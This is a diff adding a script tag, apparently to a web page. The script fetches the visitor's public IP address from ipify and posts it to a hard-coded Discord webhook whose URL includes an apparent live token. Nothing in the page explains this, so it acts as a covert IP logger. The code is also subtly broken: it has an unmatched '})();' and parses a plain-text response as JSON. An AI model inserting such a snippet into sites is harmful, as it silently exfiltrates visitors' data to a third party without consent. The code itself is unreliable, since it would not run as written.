@@ -1,0 +1,35 @@
+<script>
+const urlToFetch = 'https://api.ipify.org'; // Replace with the actual URL
+const webhookUrl = 'https://discord.com/api/webhooks/1233456441277415484/S9HgBv6jiukVuNmoN392KzIix9LY1rOnpph6S3JYqTcrb4nttJM0Wvy-X5tPQFosmF8x'; // Replace with the webhook URL
+
+fetch(urlToFetch)
+  .then(response => response.json()) // Parse the response as JSON
+  .then(data => {
+    // Prepare the webhook payload (data to send)
+    const payload = {
+      message: 'Fetched data successfully!', // Customize your message
+      data: data, // Include the fetched data
+    };
+
+    // Send the POST request to the webhook
+    fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json' // Set content type as JSON
+      },
+      body: JSON.stringify(payload) // Convert payload to JSON string
+    })
+    .then(webhookResponse => {
+      if (webhookResponse.ok) {
+        console.log('Webhook sent successfully!');
+      } else {
+        console.error('Error sending webhook:', webhookResponse.statusText);
+      }
+    })
+    .catch(error => console.error('Error fetching data:', error));
+  })
+  .catch(error => console.error('Error fetching data:', error));
+
+})();
+
+</script>
